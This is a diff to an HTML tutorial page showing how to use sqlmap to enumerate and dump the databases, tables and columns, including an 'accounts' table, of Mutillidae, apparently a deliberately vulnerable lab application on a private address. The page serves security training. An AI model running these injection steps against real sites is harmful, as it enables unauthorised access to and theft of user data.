@@ -29,7 +29,7 @@ This causes the <i>"WHERE"</i> clause to return true and all the user details ar
 			<li>
 				<p>Start by locating sqlmap if it is already installed<p>
 				<pre>
-					locate sqlmap.py
+locate sqlmap.py
 				</pre>
 				Traverse to the directory, which will be "/usr/share/sqlmap" , if it is installed
 			</li>
@@ -38,20 +38,23 @@ This causes the <i>"WHERE"</i> clause to return true and all the user details ar
 				The request URL and method type must be indentified. In this case, the GET request reflects in the URL and can be copied from there. <br> In Burp Suite this can be done using the inbuilt proxy and copying th details from there. <br> We now use the URL with SQLMap as follows.<br> The values of the username and password do not matter,those keys will be used by SQLMap for injection.
 				The 
 				<pre>
-					./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs  
+./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs  
 				</pre>
 				</li>
 				<li>
 					The above command will display the databases that could be accessed, use "<b>-D &ltDatabaseName&gt</b>" , and <b>--tables</b>to see tables for the database.
 					<pre>
-						./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp --tables
+./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp --tables
 					</pre>
 					</li>
 					<li>
 						Once ,tables are displayed,a table name can be selected using "<b>-T &lttableName&gt</b>" and display columns using "<b>--columns</b>"
 						<pre>
-							./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts --columns
+./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts --columns
 						</pre>
 </li>
-					</li>
+<li>
+	The data from the selected columns can be done by specifying the value "<b>-C &ltcolumn1,column2&gt</b>", and and dump the data using the option "<b>--dump</b>".
+</li>
+</li>
 </ol>
